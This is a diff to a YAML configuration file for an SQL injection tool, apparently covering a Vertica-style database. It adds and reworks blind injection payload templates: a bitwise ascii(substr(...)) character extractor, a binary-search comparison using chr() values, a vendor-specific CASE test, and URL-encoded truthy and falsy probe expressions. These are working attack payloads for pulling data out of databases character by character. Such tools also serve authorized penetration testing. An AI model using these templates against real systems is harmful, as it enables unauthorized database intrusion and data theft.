@@ -124,6 +124,7 @@ strategy:
    orderByErrorMessage:
     # Collision with postgres
     - (?!.*Vertica)ORDER BY position 1337 is not in select list
+   vendorSpecific: "'a' = case when ${test} then 'a' else URI_PERCENT_ENCODE('') end"
 
  union:
   indices: union select ${indices}
@@ -137,15 +138,33 @@ strategy:
      * true bit return bit, false bit return 0
      * 8 & 8 = 8, 8 & 4 = 0
      */
-    0 != (
-        ascii(
-            substr(
-                (${injection}),
-                ${window.char},
-                1
-            )
-        ) %26${bit}
+    0 != ascii(substr(
+        (${injection}),
+        ${window.char},
+        1
+    )) 
+    %26${bit}
+   bin: |
+    substr(
+        (${injection}),
+        ${window.char},
+        1
     )
+    %3E%3Dchr(${mid.int})
+   truthyBin:
+    - chr(97)%3E%3Dchr(97)
+    - chr(97)%3E%3Dchr(65)
+    - chr(97)%3E%3Dchr(48)
+    - chr(98)%3E%3Dchr(97)
+    - chr(98)%3E%3Dchr(66)
+    - chr(49)%3E%3Dchr(48)
+   falsyBin:
+    - chr(97)%3E%3Dchr(98)
+    - chr(65)%3E%3Dchr(97)
+    - chr(66)%3E%3Dchr(98)
+    - chr(66)%3E%3Dchr(97)
+    - chr(48)%3E%3Dchr(65)
+    - chr(48)%3E%3Dchr(49)
   modeAnd: and
   modeOr: or
   blind: ${binary.mode} ${test}
